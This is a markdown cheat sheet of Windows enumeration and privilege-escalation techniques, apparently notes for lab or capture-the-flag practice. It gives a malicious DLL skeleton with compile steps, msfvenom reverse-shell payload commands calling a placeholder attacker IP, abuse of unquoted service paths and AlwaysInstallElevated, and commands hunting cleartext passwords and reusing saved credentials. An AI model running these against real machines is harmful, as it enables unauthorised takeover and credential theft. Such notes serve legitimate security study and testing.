## Check version
- System Information
- `systeminfo` on command prompt

 ## Log
  - Event Viewer
	  - To see login logs: Windows Logs -> Security, search for Event ID 4624
	  - Assign special privileges is located in Security also with Event ID 4672

# cmd
## User Enumeration
```sh
whoami /priv   #current user privileges
net users      #list users
net user username    #list details of username
qwinsta       #list other users logged in simultaneously
query session # same as qwinsta
net localgroup # user group defined on the system
net localgroup group #list member of specific group

```
## System information
```shell
systeminfo    #overview of the target system
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #grep for OS
hostname   #show hostname

#show installed patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

#show network connection
nestat -ano

#query scheduled task
schtasks /query /fo LIST /v

#query drivers
driverquery

#query the service named windefend
sc query windefend
#query all service
sc queryex type=service
```
The command above can be broken down as follows;
-   `-a`: Displays all active connections and listening ports on the target system.
-   `-n`: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
-   `-o`: Displays the process ID using each listed connection.
## Searching files
```sh
findstr   # grep for windows
findstr /si password *.txt
```
Command breakdown:
`findstr`: Searches for patterns of text in files.
`/si`: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)
`password`: The command will search for the string “password” in files
`*.txt`: The search will cover files that have a .txt extension

## Launching PowerShell script
```shell
powershell.exe -nop -exec bypass  #open powershell
Import-Module .\PowerUp.ps1     # import the script
Invoke-AllChecks   # run some module on from the script
```

# Privilege Escalation
## Windows Exploit Suggester
If you can't run an automated tools like WinPEAS or PowerUp script in the target machine, you can use windows exploit suggester from you attacker machine.
https://github.com/bitsadmin/wesng
The command is
`windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt`
Where `sysinfo_output.txt` is an output of `systeminfo` from the target.

Run `windows-exploit-suggester.py –update` first to update the exploit database.

## Software Enumeration
```shell
wmic product # will dump information on installed software
wmic product get name,version,vendor #filtered to more useful info

wmic service list brief # list running service
wmic service list brief | findstr  "Running" # filtered with running

sc qc SERVICENAME # detailed info for service
```
Software found can be checked with usual exploit database(searchsploit, metasploit, etc)

## DLL Hijacking
replace existing or add missing DLL that has been manipulated to contain malicious code.
The order software looks for DLL(search order) is explained here:
https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order

In short:
If **SafeDllSearchMode** is enabled, the search order is as follows:
1.  The directory from which the application loaded.
2.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
3.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
4.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
5.  The current directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

If **SafeDllSearchMode** is disabled, the search order is as follows:
1.  The directory from which the application loaded.
2.  The current directory.
3.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
4.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
5.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Process Monitor(ProcMon) can be used to see what dll the application will load. It need elevated privilege, so you need to test it in your machine, though the application can be different depending on its version.

Then we can create a malicious dll:
```c
//this is a skeleton malicious dll
#include <windows.h>  
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {     
	if (dwReason == DLL_PROCESS_ATTACH) {         
		system("cmd.exe /k whoami > C:\\Temp\\dll.txt"); 
		        ExitProcess(0);     
	}     
	return TRUE; 
}
```
Then compile with
`x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`
from: `apt install gcc-mingw-w64-x86-64`

move it to the target path, then restart with:
`sc stop dllsvc & sc start dllsvc`

## Unquoted service path
Look for service with:
`wmic service get name,displayname,pathname,startmode`
Look for service with path that we can write on with
`.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`
accesschk can be downloaded from google.
and hijack the unquoted path with msfvenom payload:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=ATTACK_PORT -f exe > executable_name.exe`.
Catch in metasploit multi handler, And:

Start service: `sc start servicename`

## AlwaysInstallElevated
if you can set an installer to be installed with admin privilege, you can use payload from msfvenom to get a privileged reverse shell.

First try to set two registry values:
```sh
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Then create a payload with:
`msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`

then catch it in multi/handler

## Passwords
We have seen earlier that looking for configuration or user-generated files containing cleartext passwords can be rewarding. There are other locations on Windows that could hide cleartext passwords.  
  
**Saved credentials:** Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials.  
`cmdkey /list`  

If you see any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.  
`runas /savecred /user:admin reverse_shell.exe`  
  
**Registry keys:** Registry keys potentially containing passwords can be queried using the commands below.  
`reg query HKLM /f password /t REG_SZ /s`  
`reg query HKCU /f password /t REG_SZ /s`



